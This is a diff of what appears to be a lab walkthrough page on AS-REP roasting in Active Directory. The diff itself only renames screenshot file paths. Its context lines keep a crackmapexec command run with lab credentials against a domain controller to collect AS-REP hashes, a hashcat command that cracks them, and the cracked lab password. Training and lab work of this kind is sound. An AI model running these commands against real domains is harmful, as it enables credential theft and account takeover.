@@ -17,7 +17,7 @@
 
 3\. Click on "View" and enable "Advanced Features".
 
-![](<../../.gitbook/assets/image (13).png>)
+![](<../../.gitbook/assets/image (13) (1).png>)
 
 4\. Open "Users", right click the user `banktest` and click on "Properties"
 
@@ -66,7 +66,7 @@ crackmapexec ldap 10.0.0.3 -u john -p Welcome2022! --asreproast asreproast.txt
 hashcat -a 0 -m 18200 asreproast.txt passwords.txt
 ```
 
-![](<../../.gitbook/assets/image (55) (1).png>)
+![](<../../.gitbook/assets/image (55) (1) (1).png>)
 
 We successfully cracked the password of the user `bankuser`, the password is `Bank2022!`.
 
